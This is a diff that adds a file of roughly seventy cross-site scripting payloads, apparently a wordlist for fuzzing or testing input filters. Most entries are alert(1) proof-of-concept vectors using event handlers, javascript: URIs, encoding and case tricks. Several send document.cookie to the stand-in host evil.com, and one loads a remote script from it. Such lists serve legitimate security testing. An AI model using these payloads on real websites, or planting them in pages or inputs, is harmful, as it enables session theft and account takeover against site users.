@@ -1,0 +1,73 @@
+payload
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script src=//evil.com/x.js></script>
+<script>eval('alert(1)')</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert(document.cookie)">
+<img/src=x onerror=alert(1)>
+<img src=1 href=1 onerror="javascript:alert(1)">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(document.cookie)>x</a>
+javascript:alert(1)
+javascript:alert(document.cookie)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'';!--"<XSS>=&{()}
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+<script>window.location='http://evil.com'</script>
+<script>fetch('//evil.com?'+document.cookie)</script>
+<img src=x onerror=this.src='http://evil.com/?'+document.cookie>
+<body onpageshow=alert(1)>
+<div onmouseover="alert(1)">hover</div>
+<div onclick=alert(1)>click</div>
+<form action="javascript:alert(1)"><input type=submit>
+<isindex action="javascript:alert(1)" type=image>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<style>@import'javascript:alert(1)';</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
+<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<SCRIPT>alert(1);//<</SCRIPT>
+<script >alert(1)</script >
+<script\x20type="text/javascript">alert(1)</script>
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click
+<table background="javascript:alert(1)">
+<x onclick=alert(1)>click
+expression(alert(1))
+<div style="width:expression(alert(1))">
+onmouseover="alert(1)"
+" onmouseover="alert(1)
